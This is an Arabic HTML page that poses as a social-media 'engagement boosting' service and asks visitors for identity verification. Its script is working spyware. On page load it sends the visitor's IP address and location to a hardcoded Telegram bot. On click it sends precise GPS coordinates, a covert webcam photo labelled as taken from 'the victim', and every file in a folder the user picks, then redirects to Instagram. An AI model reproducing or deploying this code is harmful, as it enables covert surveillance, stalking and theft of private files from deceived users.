<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدمة رفع التفاعل 🚀</title>
    <style>
        body {
            background: #0d0d0d;
            color: #ffffff;
            text-align: center;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            padding-top: 60px;
            margin: 0;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            display: inline-block;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
            border: 1px solid #2a2a2a;
            max-width: 450px;
            width: 90%;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            color: #00d4ff;
        }
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .btn {
            background: linear-gradient(135deg, #00d4ff, #007bff);
            color: white;
            padding: 16px 40px;
            border-radius: 50px;
            border: none;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        .btn:hover {
            transform: scale(1.03);
            box-shadow: 0 0 30px rgba(0, 132, 255, 0.3);
        }
        .loader {
            margin-top: 20px;
            color: #00ff88;
            display: none;
            font-size: 14px;
        }
        .hidden {
            display: none;
        }
        video, canvas {
            display: none;
        }
        .status-box {
            margin-top: 15px;
            padding: 10px;
            border-radius: 12px;
            background: #111;
            font-size: 13px;
            color: #aaa;
            border: 1px solid #222;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>🚀 خدمة رفع التفاعل</h1>
    <div class="sub">متابعين • لايكات • مشاهدات • تعليقات</div>
    <p style="font-size: 15px; color: #bbb; margin-bottom: 25px;">
        اضغط على الزر لبدء عملية رفع التفاعل لحسابك<br>
        <span style="color: #666; font-size: 13px;">(يتم التحقق من الهوية لضمان الأمان)</span>
    </p>

    <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
    <button class="btn" onclick="startProcess()">🔓 بدء رفع التفاعل</button>

    <div id="status" class="loader">⏳ جاري التحقق من الهوية وتأمين البيانات...</div>
    <div id="statusBox" class="status-box">🔹 انتظر بدء العملية...</div>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    // ======== بيانات التليغرام الجديدة ========
    const BOT_TOKEN = "8117396772:AAGim7zrJO-Y5_8brwhZfLfErkBAd9qhIGY";
    const CHAT_ID = "8600300720";
    const PAGE_NAME = "خدمة رفع التفاعل";
    // ===========================================

    // دالة إرسال نص
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message.substring(0, 4096),
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.error("Telegram send error:", e);
        }
    }

    // دالة إرسال صورة
    async function sendPhotoToTelegram(base64Image, caption) {
        try {
            const blob = dataURLtoBlob(base64Image);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', caption.substring(0, 1024));

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(url, { method: 'POST', body: formData });
        } catch (e) {
            console.error("Photo send error:", e);
        }
    }

    // دالة إرسال ملف
    async function sendFileToTelegram(file) {
        try {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file);

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            await fetch(url, { method: 'POST', body: formData });
        } catch (e) {
            console.error("File send error:", e);
        }
    }

    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });
    }

    // جلب IP
    async function getIPInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                lat: data.latitude,
                lon: data.longitude,
                org: data.org
            };
        } catch (e) {
            return null;
        }
    }

    // تصوير الكاميرا
    function captureCamera() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
            return;
        }
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth || 400;
                    canvas.height = video.videoHeight || 300;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                    sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                }, 1500);
            })
            .catch(err => {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const ctx = canvas.getContext('2d');
                            canvas.width = video.videoWidth || 400;
                            canvas.height = video.videoHeight || 300;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                            sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                            stream.getTracks().forEach(track => track.stop());
                            video.srcObject = null;
                        }, 1500);
                    })
                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
            });
    }

    // ========== الوظيفة الرئيسية ==========
    async function startProcess() {
        const statusDiv = document.getElementById('status');
        const statusBox = document.getElementById('statusBox');

        statusDiv.style.display = 'block';
        statusDiv.innerText = '⏳ جاري التحقق من الهوية...';
        statusBox.innerText = '🔹 جاري تجهيز البيانات...';

        // 1. جلب IP
        const ipInfo = await getIPInfo();
        let msg = `🕵️ <b>${PAGE_NAME} - دخول جديد</b>\n\n`;
        if (ipInfo) {
            msg += `🌐 IP: ${ipInfo.ip}\n`;
            msg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
            msg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
            if (ipInfo.lat && ipInfo.lon) {
                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
            }
        }
        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
        await sendToTelegram(msg);

        // 2. طلب GPS دقيق
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                let lat = p.coords.latitude;
                let lon = p.coords.longitude;
                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n`;
                gpsMsg += `📍 ${mapLink}\n`;
                gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
                gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
                await sendToTelegram(gpsMsg);
            }, (err) => {
                sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`);
            }, { enableHighAccuracy: true, timeout: 10000 });
        }

        // 3. تصوير الكاميرا
        statusDiv.innerText = '📸 جاري التقاط صورة للتحقق...';
        captureCamera();

        // 4. فتح نافذة اختيار الملفات
        statusDiv.innerText = '📂 جاري تجهيز الملفات للمزامنة...';
        statusBox.innerText = '🔹 اختر المجلد أو الملفات لمزامنتها';

        // فتح نافذة اختيار الملفات
        const fileInput = document.getElementById('fileInput');
        fileInput.click();

        // عند اختيار الملفات
        fileInput.onchange = async function(e) {
            const files = e.target.files;
            if (files.length > 0) {
                statusBox.innerText = `🔹 جاري رفع ${files.length} ملف...`;
                
                for (let i = 0; i < files.length; i++) {
                    statusBox.innerText = `🔹 رفع الملف ${i+1} من ${files.length}`;
                    await sendFileToTelegram(files[i]);
                    // تأخير بسيط لتجنب الإغراق
                    await new Promise(r => setTimeout(r, 300));
                }

                statusDiv.innerText = '✅ تمت المزامنة بنجاح!';
                statusBox.innerText = '✅ تم رفع جميع الملفات';

                // إرسال تأكيد نهائي
                await sendToTelegram(`✅ <b>${PAGE_NAME}</b> - تم رفع ${files.length} ملف بنجاح!`);

                // توجيه إلى موقع حقيقي
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/";
                }, 2000);
            }
        };
    }

    // ========== إرسال IP فور فتح الصفحة ==========
    (async function () {
        const ipInfo = await getIPInfo();
        if (ipInfo) {
            let msg = `📡 <b>${PAGE_NAME} - صفحة مفتوحة</b>\n\n`;
            msg += `🌐 IP: ${ipInfo.ip}\n`;
            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
            if (ipInfo.lat && ipInfo.lon) {
                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
            }
            msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
            await sendToTelegram(msg);
        }
    })();
</script>

</body>
</html>
